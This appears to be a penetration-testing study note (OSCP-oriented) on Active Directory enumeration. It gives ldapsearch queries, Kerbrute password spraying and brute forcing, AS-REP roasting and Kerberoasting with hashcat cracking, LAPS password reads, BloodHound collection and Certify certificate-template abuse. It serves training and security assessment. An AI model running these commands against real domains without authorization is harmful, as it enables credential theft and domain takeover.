---
title: Active Directory Enumeration
description: LDAP queries, Kerberos enumeration, trust mapping, ACL auditing
tags: [enumeration, active-directory, oscp, ad]
difficulty: Intermediate
tools: [ldapsearch, Kerbrute, PowerView, BloodHound, adPEAS]
---

#  Active Directory Enumeration

> AD enumeration is critical for understanding the domain structure, finding weak configurations, and planning privilege escalation chains.

## Quick Commands

```bash
# Discover naming contexts
ldapsearch -x -h <RHOST> -s base namingcontexts

# Anonymous user enumeration
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" | grep userPrincipalName

# Find LAPS passwords
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# Kerbrute user enumeration
./kerbrute userenum -d <DOMAIN> --dc <RHOST> /usr/share/wordlists/users.txt

# BloodHound ingestor (PowerShell)
. .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All
```

---

## 1. LDAP Enumeration

### ldapsearch - Querying LDAP Directory

#### Discovery Phase

```bash
# Discover LDAP base (naming contexts)
ldapsearch -x -h <RHOST> -s base namingcontexts
# Output: namingContexts: DC=domain,DC=local

# Query root DSE for server info
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
# Shows: supportedSASLMechanisms, supportedLDAPVersion, serverName
```

#### User Enumeration

```bash
# List all users
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(objectClass=user)" \
  sAMAccountName,userPrincipalName,displayName,mail

# Users in specific OU
ldapsearch -x -h <RHOST> -b "OU=IT,DC=<DOMAIN>,DC=<TLD>" \
  "(objectClass=user)" sAMAccountName
```

#### Group Enumeration

```bash
# List all groups
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(objectClass=group)" cn,member

# Members of specific group
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(cn=Domain Admins)" member

# Nested group membership
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(memberOf=CN=Domain Admins,CN=Users,DC=<DOMAIN>,DC=<TLD>)"
```

#### Computer Enumeration

```bash
# List all computers
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(objectClass=computer)" \
  dNSHostName,operatingSystem,description

# Domain controllers only
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(primaryGroupID=516)" dNSHostName
```

#### LAPS Password Discovery

```bash
# Search for LAPS passwords (if admin of domain)
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(ms-MCS-AdmPwd=*)" \
  sAMAccountName,ms-MCS-AdmPwd
```

### Anonymous LDAP Binding

```bash
# Check if anonymous LDAP bind is allowed
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" -w "" 2>&1 | head

# If successful, you can enumerate without credentials
```

---

## 2. Kerberos Enumeration

### Kerbrute - User Enumeration

```bash
# Enumerate valid AD users (no authentication needed)
./kerbrute userenum -d <DOMAIN> --dc <RHOST> /path/to/userlist.txt -t 100

# Password spray (try one password on all users)
./kerbrute passwordspray -d <DOMAIN> --dc <RHOST> \
  /path/to/userlist.txt "Password123!" -t 50

# Brute force one user (slower, more logging)
./kerbrute bruteuser -d <DOMAIN> --dc <RHOST> \
  /path/to/passwords.txt <USERNAME>
```

### GetNPUsers - AS-REP Roasting

```bash
# Find users with "Do not require Kerberos preauthentication"
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <RHOST> -request

# Crack the hash
hashcat -m 18200 asreproast.txt wordlist.txt
```

---

## 3. Domain Trust Enumeration

### Trust Discovery via LDAP

```bash
# List all trusts
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(objectClass=trustedDomain)" \
  cn,trustDirection,trustType

# Trust relationship interpretation:
# trustDirection: 0 (disabled), 1 (inbound), 2 (outbound), 3 (bidirectional)
```

### Via PowerView

```powershell
# List domain trusts
Get-DomainTrust

# Map trust relationships
Get-DomainTrust -Domain <DOMAIN1> | Select-Object -Property "SourceName","TargetName","TrustDirection"

# Find forest trusts
Get-ForestTrust -Forest <FOREST>
```

---

## 4. Group Policy & DACL Enumeration

### Group Policy Discovery

```bash
# Enumerate Group Policy Objects
ldapsearch -x -h <RHOST> -b "CN=Policies,CN=System,DC=<DOMAIN>,DC=<TLD>" \
  "(objectClass=groupPolicyContainer)" \
  displayName,gPCFileSysPath

# Dangerous settings to look for:
# - Autologon (stored passwords)
# - Scheduled tasks (privilege escalation)
# - File/printer sharing passwords
```

### ACL Enumeration (BloodHound)

BloodHound visualizes ACLs and privilege escalation paths:

```bash
# On Windows target, collect AD data
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All,LoggedOn -NoSaveCache

# Transfer .zip to attacker, import into BloodHound
neo4j console     # Start Neo4j (default: http://localhost:7474)
# Import BloodHound data, explore graph
```

### Manual DACL Checks

```bash
# Find users/groups with dangerous permissions over OUs/computers
# This requires domain user credentials, use:
# - ADCSKiller for certificate abuse
# - Certify for certificate template enumeration
./Certify.exe cas /ca:<CA_NAME>
./Certify.exe req /template:SubCA /caname:<CA_NAME>
```

---

## 5. Service Principal Name (SPN) Enumeration

### Kerberoasting

```bash
# Find service accounts with spns
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(servicePrincipalName=*)" \
  servicePrincipalName,sAMAccountName,userAccountControl

# Request TGS for service account
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -request

# Crack the hash
hashcat -m 13100 kerberoast.txt wordlist.txt
```

---

## 6. PowerView - Comprehensive AD Enumeration

PowerView is a powerful PowerShell module for AD enumeration:

```powershell
# Load PowerView
. .\PowerView.ps1

# User enumeration
Get-DomainUser | Select-Object -Property "samaccountname","description","pwdLastSet"
Get-DomainUser -Spn | Select-Object -Property "samaccountname","serviceprincipalname"

# Group enumeration
Get-DomainGroup | Select-Object -Property "name","description"
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName

# Computer enumeration
Get-DomainComputer | Select-Object -Property "dnshostname","operatingsystem"
Get-DomainComputer -Spn | Select-Object -Property "dnshostname","serviceprincipalname"

# Forest/trust mapping
Get-ForestDomain
Get-DomainTrust
Get-ForestTrust
```

---

## 7. Credential Harvesting

### LAPS (Local Administrator Password Solution)

```bash
# Read LAPS password (if you have permission)
ldapsearch -x -h <RHOST> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(cn=<COMPUTER>)" ms-MCS-AdmPwd | grep -i "ms-MCS-AdmPwd"
```

### Default Credentials

Common AD service accounts with weak/default passwords:
- `krbtgt` — Kerberos account (usually strong)
- Service accounts in Group Policy
- IMIS\<service> accounts
- SQL service accounts
- Application pools

---

## 8. Dangerous AD Misconfigurations

### Check For:

| Misconfiguration | Check | Impact |
|-----------------|-------|--------|
| AS-REP Roastable | Kerberos preauthentication disabled | Offline password crack |
| Kerberoastable | Service accounts with SPNs | Offline password crack |
| Unconstrained delegation | userAccountControl TRUSTED_FOR_DELEGATION | Privilege escalation |
| Resource-based constrained delegation | msDS-AllowedToActOnBehalfOfOtherIdentity | Privilege escalation |
| LAPS readable by domain users | ms-MCS-AdmPwd readable | Local admin access |
| GMSA password readable | msds-ManagedPasswordInterval | Local admin access |
| Certificate template abuse | Enrollable dangerous templates | Domain admin privesc |
| PrintNightmare | Print Spooler enabled + SYSTEM RPC | RCE as SYSTEM |

---

##  AD Enumeration Checklist

- [ ] Domain name and FQDN identified
- [ ] Domain controllers located and fingerprinted
- [ ] All users enumerated (especially admins, service accounts)
- [ ] All groups listed, membership mapped
- [ ] All computers enumerated
- [ ] Domain trusts mapped (inbound/outbound)
- [ ] AS-REP roastable users found
- [ ] Kerberoastable service accounts identified
- [ ] LAPS passwords checked (if accessible)
- [ ] Group Policy objects and dangerous settings reviewed
- [ ] Certificate authority and templates enumerated
- [ ] Dangerous delegations identified
- [ ] DACL misconfigurations found (via BloodHound)

---

##  Related Notes

- [[Exploitation/Windows/Active-Directory-Attacks|AD Attacks]]
- [[Exploitation/Windows/Privilege-Escalation|Windows PrivEsc]]
- [[Exploitation/Windows/NTLM-Relay|NTLM Relay]]

---

**Status**: Complete | **Last Updated**: 2026-10-07
